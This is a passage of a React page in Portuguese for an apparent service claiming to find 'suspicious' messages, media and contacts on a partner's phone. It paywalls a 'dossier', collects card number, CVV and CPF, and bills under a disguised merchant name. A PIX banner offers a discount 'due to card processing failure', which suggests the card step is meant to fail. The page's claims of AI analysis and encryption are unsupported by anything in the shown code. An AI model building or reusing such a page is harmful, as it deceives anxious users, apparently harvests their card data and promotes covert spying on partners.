                          Organizamos os principais indícios para que você avalie cada evidência com clareza, sigilo e suporte especializado.
                        </p>
                      </div>

                      <div className="rounded-3xl border border-rose-100 bg-white/90 px-8 py-5 text-center shadow-lg shadow-rose-100/50">
                        <span className="text-xs font-semibold uppercase tracking-[0.2em] text-slate-500">Total de indícios</span>
                        <p className="mt-3 text-4xl font-bold text-rose-600 md:text-5xl">
                          {(steps[1]?.count || 0) + (steps[2]?.count || 0) + (steps[3]?.count || 0)}
                        </p>
                        <p className="mt-1 text-xs font-medium text-slate-500">
                          Mensagens, mídias e contatos identificados
                        </p>
                      </div>
                    </div>

                    <div className="grid gap-4 md:grid-cols-3">
                      <div className="rounded-3xl border border-rose-50 bg-white px-6 py-7 shadow-sm shadow-rose-100/40">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-semibold uppercase tracking-[0.2em] text-slate-400">Mensagens suspeitas</span>
                          <div className="rounded-2xl bg-rose-100/80 p-2 text-rose-500">
                            <MessageCircle className="h-5 w-5" />
                          </div>
                        </div>
                        <p className="mt-5 text-4xl font-semibold text-slate-900">{steps[1]?.count || 0}</p>
                        <p className="mt-2 text-xs font-medium text-slate-500">Conversas com padrão de comportamento fora do habitual.</p>
                      </div>

                      <div className="rounded-3xl border border-rose-50 bg-white px-6 py-7 shadow-sm shadow-rose-100/40">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-semibold uppercase tracking-[0.2em] text-slate-400">Mídias críticas</span>
                          <div className="rounded-2xl bg-rose-100/80 p-2 text-rose-500">
                            <Image className="h-5 w-5" />
                          </div>
                        </div>
                        <p className="mt-5 text-4xl font-semibold text-slate-900">{steps[2]?.count || 0}</p>
                        <p className="mt-2 text-xs font-medium text-slate-500">Fotos, áudios ou vídeos que exigem atenção imediata.</p>
                      </div>

                      <div className="rounded-3xl border border-rose-50 bg-white px-6 py-7 shadow-sm shadow-rose-100/40">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-semibold uppercase tracking-[0.2em] text-slate-400">Contatos suspeitos</span>
                          <div className="rounded-2xl bg-rose-100/80 p-2 text-rose-500">
                            <Search className="h-5 w-5" />
                          </div>
                        </div>
                        <p className="mt-5 text-4xl font-semibold text-slate-900">{steps[3]?.count || 0}</p>
                        <p className="mt-2 text-xs font-medium text-slate-500">Perfis com interações recorrentes e fora do comum.</p>
                      </div>
                    </div>

                    <div className="grid gap-6 lg:grid-cols-[1.5fr,1fr]">
                      <div className="rounded-3xl border border-rose-50 bg-white px-7 py-6 shadow-md shadow-rose-100/40">
                        <div className="flex items-start gap-4">
                          <div className="rounded-2xl bg-rose-500/10 p-3 text-rose-500">
                            <TrendingUp className="h-6 w-6" />
                          </div>
                          <div className="space-y-4">
                            <div>
                              <span className="inline-flex items-center gap-2 rounded-full bg-rose-50 px-3 py-1 text-xs font-semibold uppercase tracking-[0.2em] text-rose-600">
                                Índice de risco
                              </span>
                              <h4 className="mt-3 text-2xl font-semibold text-slate-900">
                                Risco {((steps[1]?.count || 0) + (steps[2]?.count || 0) + (steps[3]?.count || 0)) >= 20 ? 'alto' : ((steps[1]?.count || 0) + (steps[2]?.count || 0) + (steps[3]?.count || 0)) >= 12 ? 'moderado' : 'em evolução'}
                              </h4>
                            </div>
                            <p className="text-sm text-slate-600">
                              Nossa inteligência cruza padrões de horário, termos-chave e intensidade de contato para atribuir um grau de risco confiável ao comportamento analisado.
                            </p>
                            <ul className="space-y-2 text-sm text-slate-600">
                              <li className="flex items-center gap-2">
                                <ShieldCheck className="h-4 w-4 text-emerald-500" />
                                Evidências categorizadas por relevância e cronologia.
                              </li>
                              <li className="flex items-center gap-2">
                                <Lock className="h-4 w-4 text-rose-500" />
                                Proteção de ponta a ponta com criptografia avançada.
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>

                      <div className="flex flex-col justify-between rounded-3xl border border-rose-50 bg-gradient-to-b from-white via-rose-50/40 to-white px-7 py-6 text-center shadow-md shadow-rose-100/40">
                        <div className="space-y-3">
                          <span className="inline-flex items-center justify-center gap-2 rounded-full border border-rose-100 bg-white/80 px-4 py-1 text-xs font-semibold uppercase tracking-[0.2em] text-rose-600">
                            <CheckCircle className="h-4 w-4" />
                            Relatório pronto
                          </span>
                          <h4 className="text-2xl font-semibold text-slate-900">Libere o dossiê completo</h4>
                          <p className="text-sm text-slate-600">
                            Acesse conversas, mídias e recomendações personalizadas com poucos cliques e total discrição.
                          </p>
                        </div>

                        {!showPaymentPlans ? (
                          <button
                            onClick={handleShowPaymentPlans}
                            className="btn-gradient w-full justify-center px-6 py-3 text-base font-semibold shadow-lg shadow-rose-200/60"
                          >
                            Consultar relatório completo
                          </button>
                        ) : (
                          <p className="text-sm font-semibold text-rose-600">
                            👇 Selecione um plano para liberar todas as evidências
                          </p>
                        )}

                        <p className="text-xs text-slate-500">
                          Aprovação imediata e identificação confidencial em todo o processo.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </section>

        {showPaymentPlans && (
          <section id="payment-plans" className="relative pb-16">
            <div className="mx-auto max-w-6xl px-4">
              <div className="text-center">
                <span className="section-subtitle">Planos de acesso</span>
                <h2 className="section-title mt-3 text-3xl md:text-4xl">
                  Escolha como liberar o relatório completo
                </h2>
                <p className="mx-auto mt-4 max-w-2xl text-base text-slate-600">
                  Compare os planos de análise e selecione o formato ideal para acessar todas as evidências com total segurança.
                </p>
              </div>

              <div className="mt-12 grid gap-6 md:grid-cols-2">
                {planOptions.map(plan => {
                  const isSelected = plan.id === selectedPlan
                  return (
                    <button
                      key={plan.id}
                      type="button"
                      onClick={() => setSelectedPlan(plan.id)}
                      className={`group relative flex h-full flex-col rounded-[2.25rem] border-2 bg-white p-8 text-left shadow-xl transition-all duration-300 backdrop-blur hover:-translate-y-1 hover:shadow-rose-200/70 ${
                        isSelected ? 'border-rose-500 ring-4 ring-rose-500/20' : 'border-white/60'
                      } ${plan.highlight ? 'bg-gradient-to-br from-white via-rose-50/40 to-amber-50/40' : 'bg-white/92'}`}
                    >
                      <div className="flex items-center justify-between">
                        <span
                          className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs font-semibold uppercase tracking-[0.2em] ${
                            plan.highlight
                              ? 'bg-rose-500 text-white'
                              : 'bg-rose-100 text-rose-600'
                          }`}
                        >
                          {plan.badge}
                        </span>
                        <div
                          className={`flex h-6 w-6 items-center justify-center rounded-full border-2 ${
                            isSelected ? 'border-rose-500 bg-rose-500 text-white' : 'border-rose-200 text-transparent'
                          } transition-colors duration-300`}
                        >
                          <CheckCircle className="h-4 w-4" />
                        </div>
                      </div>

                      <div className="mt-6 space-y-4">
                        <div>
                          <h3 className="text-2xl font-semibold text-slate-900">{plan.name}</h3>
                          <p className="mt-2 text-sm text-slate-600">{plan.subtitle}</p>
                        </div>
                        <div className="flex items-end gap-2">
                          <span className="text-4xl font-bold text-rose-600">{plan.priceLabel}</span>
                          <span className="text-xs font-semibold uppercase tracking-[0.28em] text-slate-400">
                            Pagamento único
                          </span>
                        </div>
                      </div>

                      <ul className="mt-6 space-y-3 text-sm text-slate-600">
                        {plan.benefits.map((benefit, index) => (
                          <li key={index} className="flex items-start gap-3">
                            <span className="mt-0.5 flex h-5 w-5 items-center justify-center rounded-full bg-rose-100 text-rose-500">
                              <CheckCircle className="h-3.5 w-3.5" />
                            </span>
                            <span>{benefit}</span>
                          </li>
                        ))}
                      </ul>

                      <div className="mt-8 flex items-center justify-between text-sm text-slate-500">
                        <span>{plan.highlight ? 'Inclui acesso ilimitado' : 'Acesso imediato por 7 dias'}</span>
                        <span className="inline-flex items-center gap-2 text-rose-500 transition group-hover:text-rose-600">
                          Selecionar plano
                          <ArrowRight className="h-4 w-4" />
                        </span>
                      </div>
                    </button>
                  )
                })}
              </div>

              <div className="mt-12 flex flex-col items-center gap-3 text-center">
                <button
                  onClick={handleProceedToPayment}
                  className="btn-gradient flex items-center justify-center gap-3 rounded-full px-8 py-4 text-lg font-semibold shadow-lg shadow-rose-200/60"
                >
                  <Shield className="h-5 w-5" />
                  Continuar com {selectedPlanOption.name} — {planDisplayPrice}
                </button>
                <p className="flex items-center gap-2 text-sm text-slate-500">
                  <span className="inline-flex h-2 w-2 rounded-full bg-emerald-400"></span>
                  Pagamento 100% seguro e confidencial
                </p>
              </div>
            </div>
          </section>
        )}

        {showPaymentMethods && (
          <section id="payment-methods" className="pb-16">
            <div className="mx-auto max-w-6xl px-4">
              <div className="card-surface border border-white/60 bg-white/90 p-8 shadow-2xl backdrop-blur-xl">
                <div className="mb-10 text-center">
                  <span className="inline-flex items-center gap-2 rounded-full border border-rose-100 bg-rose-50 px-4 py-1 text-xs font-semibold uppercase tracking-[0.2em] text-rose-500">
                    Checkout seguro
                  </span>
                  <h3 className="mt-4 text-3xl font-semibold text-slate-900 md:text-4xl">
                    Liberar relatório {selectedPlanOption.highlight ? 'vitalício' : 'completo'}
                  </h3>
                  <p className="mx-auto mt-3 max-w-2xl text-base text-slate-600">
                    Escolha a forma de pagamento que preferir e tenha acesso imediato a todas as evidências da análise.
                  </p>
                  <div className="mt-6 flex flex-col items-center gap-2">
                    <span className="text-lg font-semibold text-rose-600">{planDisplayPrice} {showPixDiscount && <span className="text-sm font-medium text-emerald-600">(Pix: {pixDiscountDisplay})</span>}</span>
                    <p className="text-xs text-slate-500">Plano selecionado: {selectedPlanOption.name}</p>
                  </div>
                </div>

                <div className="mb-8 flex flex-col items-center gap-3 text-sm font-semibold text-emerald-600">
                  <div className="inline-flex items-center gap-2 rounded-full bg-emerald-50 px-4 py-2">
                    <CheckCircle className="h-4 w-4" />
                    Pagamento protegido por criptografia e aprovação instantânea
                  </div>
                </div>

                <div className="mx-auto mb-8 grid max-w-4xl grid-cols-1 gap-6 md:grid-cols-2">
                  {/* Cartão de Crédito - REDESENHADO */}
                  <div
                    onClick={() => setPaymentMethod('card')}
                    className={`relative cursor-pointer group transition-all duration-300 ${
                      paymentMethod === 'card'
                        ? 'transform scale-105'
                        : 'hover:scale-102'
                    }`}
                  >
                    <div className={`relative p-8 rounded-3xl transition-all duration-300 ${
                      paymentMethod === 'card'
                        ? 'bg-white border-3 border-red-500 shadow-2xl shadow-red-500/30'
                        : 'bg-white border-2 border-gray-200 hover:border-red-300 hover:shadow-xl'
                    }`}>
                      {/* Ícone */}
                      <div className="mb-6 flex justify-center">
                        <div className={`relative p-5 rounded-2xl transition-all duration-300 ${
                          paymentMethod === 'card'
                            ? 'bg-red-50 border-2 border-red-200'
                            : 'bg-gray-100 group-hover:bg-red-50'
                        }`}>
                          <CreditCard className="w-12 h-12 text-gray-700 group-hover:text-red-600" />
                        </div>
                      </div>
                      
                      {/* Conteúdo */}
                      <div className="text-center">
                        <h3 className="mb-3 text-2xl font-bold text-gray-900">
                          Cartão de Crédito
                        </h3>
                        <p className="mb-4 text-sm text-gray-600">
                          Visa • Mastercard • Elo • Amex
                        </p>
                        <div className="flex items-center justify-center gap-2 text-sm">
                          <Shield className="h-4 w-4 text-green-600" />
                          <span className="font-medium text-gray-700">Pagamento Seguro</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* PIX - REDESENHADO */}
                  <div
                    onClick={() => setPaymentMethod('pix')}
                    className={`relative cursor-pointer group transition-all duration-300 ${
                      paymentMethod === 'pix'
                        ? 'transform scale-105'
                        : 'hover:scale-102'
                    }`}
                  >
                    <div className={`relative p-8 rounded-3xl transition-all duration-300 ${
                      paymentMethod === 'pix'
                        ? 'bg-white border-3 border-green-500 shadow-2xl shadow-green-500/30'
                        : 'bg-white border-2 border-gray-200 hover:border-green-300 hover:shadow-xl'
                    }`}>
                      {/* Ícone PIX */}
                      <div className="mb-6 flex justify-center">
                        <div className={`relative p-5 rounded-2xl transition-all duration-300 ${
                          paymentMethod === 'pix'
                            ? 'bg-green-50 border-2 border-green-200'
                            : 'bg-gray-100 group-hover:bg-green-50'
                        }`}>
                          <svg className="w-12 h-12 text-gray-700 group-hover:text-green-600" viewBox="0 0 512 512" fill="currentColor">
                            <path d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.2H112.6C132.6 391.2 151.5 383.4 165.7 369.2L242.4 292.5zM262.5 218.9C257.1 224.3 247.8 224.3 242.4 218.9L165.7 142.2C151.5 127.1 132.6 120.2 112.6 120.2H103.3L200.7 22.8C231.1-7.6 280.3-7.6 310.6 22.8L407.8 120H392.6C372.6 120 353.7 127.8 339.5 142L262.5 218.9zM112.6 142.7C126.4 142.7 139.1 148.3 149.7 158.1L226.4 234.8C233.6 241.1 243 245.6 252.5 245.6C261.9 245.6 271.3 241.1 278.5 234.8L355.5 157.8C365.3 148.1 378.8 142.5 392.6 142.5H430.3L488.6 200.8C518.9 231.1 518.9 280.3 488.6 310.6L430.3 368.9H392.6C378.8 368.9 365.3 363.3 355.5 353.5L278.5 276.5C264.6 262.6 240.3 262.6 226.4 276.5L149.7 353.2C139.1 363 126.4 368.6 112.6 368.6H80.78L22.76 310.6C-7.586 280.3-7.586 231.1 22.76 200.8L80.78 142.7H112.6z"/>
                          </svg>
                        </div>
                      </div>
                      
                      {/* Conteúdo */}
                      <div className="text-center">
                        <h3 className="mb-3 text-2xl font-bold text-gray-900">
                          PIX
                        </h3>
                        <p className="mb-4 text-sm text-gray-600">
                          Pagamento instantâneo e seguro
                        </p>
                        <div className="flex items-center justify-center gap-2 text-sm">
                          <CheckCircle className="h-4 w-4 text-green-600" />
                          <span className="font-semibold text-green-600">Aprovação Imediata</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Payment Form - PIX */}
                {paymentMethod === 'pix' && (
                  <div className="mx-auto max-w-2xl">
                    {showPixDiscount && (
                      <div className="mb-6 rounded-2xl border-2 border-yellow-400 bg-gradient-to-r from-yellow-50 to-orange-50 p-6 shadow-lg">
                        <div className="flex items-center gap-4">
                          <div className="flex-shrink-0 rounded-full bg-yellow-400 p-3">
                            <Star className="h-8 w-8 text-white" />
                          </div>
                          <div className="flex-1">
                            <h4 className="mb-2 text-2xl font-bold text-yellow-900">
                              🎉 Desconto Especial de 20% Ativado!
                            </h4>
                            <p className="mb-4 text-base text-yellow-800">
                              Devido à falha no processamento do cartão, você ganhou um desconto exclusivo no PIX!
                            </p>
                            <div className="flex flex-wrap items-center gap-3">
                              <div className="flex items-baseline gap-1.5">
                                <span className="text-xs font-medium text-yellow-700">De:</span>
                                <span className="text-lg text-yellow-700 line-through">
                                  {planDisplayPrice}
                                </span>
                              </div>
                              <div className="flex items-baseline gap-1.5">
                                <span className="text-xs font-medium text-yellow-900">Por:</span>
                                <span className="text-2xl font-bold text-green-700">
                                  {pixDiscountDisplay}
                                </span>
                              </div>
                              <span className="rounded-full bg-yellow-400 px-3 py-1 text-xs font-bold text-yellow-900 shadow-sm">
                                -20% OFF
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                    <QRCodePix
                      amount={showPixDiscount ? pixDiscountValue : planValue}
                      whatsapp={analysisData?.whatsapp}
                      nome={displayName}
                      onPaymentConfirmed={handlePixPayment}
                    />
                    <p className="mt-4 text-center text-sm text-slate-500">
                      Ao confirmar o pagamento, o relatório será liberado automaticamente.
                    </p>
                  </div>
                )}

                {/* Payment Form - Cartão */}
                {paymentMethod === 'card' && (
                  <div className="mx-auto max-w-2xl">
                    <div className="space-y-4">
                      <div className="mb-4 rounded-xl border border-blue-200 bg-blue-50 p-4">
                        <div className="flex items-start">
                          <div className="mr-3 mt-0.5 text-blue-600">ℹ️</div>
                          <div>
                            <h4 className="mb-1 font-semibold text-blue-800">Observação importante</h4>
                            <p className="text-sm text-blue-700">
                              A fatura estará em nome de <strong>Comércio e Varejista Papel Pardo</strong> para garantir total discrição.
                            </p>
                          </div>
                        </div>
                      </div>

                      <div className="grid gap-4 md:grid-cols-2">
                        <div>
                          <label className="mb-2 block text-sm font-semibold text-gray-800">
                            Número do Cartão *
                          </label>
                          <input
                            type="text"
                            name="cardNumber"
                            value={cardData.cardNumber}
                            onChange={handleCardInputChange}
                            placeholder="1234 5678 9012 3456"
                            className="input-field"
                            maxLength={19}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="mb-2 block text-sm font-semibold text-gray-800">
                            Nome no Cartão *
                          </label>
                          <input
                            type="text"
                            name="cardHolder"
                            value={cardData.cardHolder}
                            onChange={handleCardInputChange}
                            placeholder="NOME COMPLETO"
                            className="input-field"
                            required
                          />
                        </div>
                      </div>

                      <div className="grid gap-4 md:grid-cols-3">
                        <div>
                          <label className="mb-2 block text-sm font-semibold text-gray-800">
                            Validade *
                          </label>
                          <input
                            type="text"
                            name="expiryDate"
                            value={cardData.expiryDate}
                            onChange={handleCardInputChange}
                            placeholder="MM/AA"
                            className="input-field"
                            maxLength={5}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="mb-2 block text-sm font-semibold text-gray-800">
                            CVV *
                          </label>
                          <input
                            type="text"
                            name="cvv"
                            value={cardData.cvv}
                            onChange={handleCardInputChange}
                            placeholder="123"
                            className="input-field"
                            maxLength={3}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="mb-2 block text-sm font-semibold text-gray-800">
                            CPF *
                          </label>
                          <input
                            type="text"
                            name="cpf"
                            value={cardData.cpf}
                            onChange={handleCardInputChange}
                            placeholder="000.000.000-00"
                            className="input-field"
                            maxLength={14}
                            inputMode="numeric"
                            required
                          />
                        </div>
                      </div>

                      <div className="grid gap-4 md:grid-cols-2">
                        <div>
                          <label className="mb-2 block text-sm font-semibold text-gray-800">
                            E-mail
                          </label>
                          <input
                            type="email"
                            name="email"
                            value={cardData.email}
                            onChange={handleCardInputChange}
                            placeholder="seu@email.com"
                            className="input-field"
                            pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
                          />
                        </div>
                        <div>
                          <label className="mb-2 block text-sm font-semibold text-gray-800">
                            Telefone
                          </label>
                          <input
                            type="tel"
                            name="phone"
                            value={cardData.phone}
                            onChange={handleCardInputChange}
                            placeholder="(11) 99999-9999"
                            className="input-field"
                          />
                        </div>
                      </div>

                      {cardError && (
                        <div className="rounded-xl border border-red-200 bg-red-50 p-4">
                          <div className="flex items-start">
                            <AlertTriangle className="mr-3 mt-0.5 h-5 w-5 text-red-600" />
                            <div>
                              <h4 className="mb-1 font-semibold text-red-800">Erro no pagamento</h4>
                              <p className="text-sm text-red-700">{cardError}</p>
                            </div>
                          </div>
                        </div>
                      )}

                      <button
                        onClick={handleCardPayment}
                        disabled={isProcessing}
                        className="btn-gradient w-full justify-center"
                      >
                        {isProcessing ? (
                          <div className="flex items-center justify-center">
                            <div className="mr-3 h-6 w-6 animate-spin rounded-full border-b-2 border-white"></div>
                            Processando pagamento...
                          </div>
                        ) : (
                          <>
                            <CreditCard className="mr-2 inline h-6 w-6" />
                            Pagar {planDisplayPrice}
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </section>
        )}

        <section className="pb-20">
          <div className="mx-auto max-w-5xl px-4">
            <div className="relative overflow-hidden rounded-3xl border border-white/60 bg-white/90 p-10 text-center shadow-xl backdrop-blur-xl">
              <div className="absolute -inset-32 -z-10 bg-gradient-to-br from-emerald-100 via-transparent to-rose-100 opacity-70 blur-3xl"></div>
              <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full border border-emerald-200 bg-emerald-50 text-emerald-500 shadow-lg">
                <Shield className="h-10 w-10" />
              </div>
              <h3 className="mt-6 text-3xl font-semibold text-slate-900">Análise 100% sigilosa</h3>
              <p className="mt-3 text-base text-slate-600 md:text-lg">
                Toda a investigação é criptografada de ponta a ponta. Seus dados não são compartilhados e o acesso fica restrito somente a você.
              </p>

              <div className="mt-8 grid gap-4 md:grid-cols-3">
                <div className="card-surface border-white/60 bg-white/85 text-left shadow-sm">
                  <div className="flex items-center gap-3 text-emerald-600">
                    <CheckCircle className="h-5 w-5" />
                    <span className="text-sm font-semibold uppercase tracking-[0.18em]">Criptografia</span>
                  </div>
                  <p className="mt-3 text-sm text-slate-600">
                    Proteção avançada em todos os dados transmitidos e armazenados durante a análise.
                  </p>
                </div>
                <div className="card-surface border-white/60 bg-white/85 text-left shadow-sm">
                  <div className="flex items-center gap-3 text-rose-500">
                    <Lock className="h-5 w-5" />
                    <span className="text-sm font-semibold uppercase tracking-[0.18em]">Sigilo total</span>
                  </div>
                  <p className="mt-3 text-sm text-slate-600">
                    Nome da cobrança discreto e histórico acessível somente com autenticação.
                  </p>
                </div>
                <div className="card-surface border-white/60 bg-white/85 text-left shadow-sm">
                  <div className="flex items-center gap-3 text-slate-700">
                    <ShieldCheck className="h-5 w-5" />
                    <span className="text-sm font-semibold uppercase tracking-[0.18em]">Suporte dedicado</span>
                  </div>
                  <p className="mt-3 text-sm text-slate-600">
                    Equipe pronta para acompanhar dúvidas sobre pagamento, relatório e segurança.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </section>
      </main>
    </div>
  )
}

export default AnalysisPage
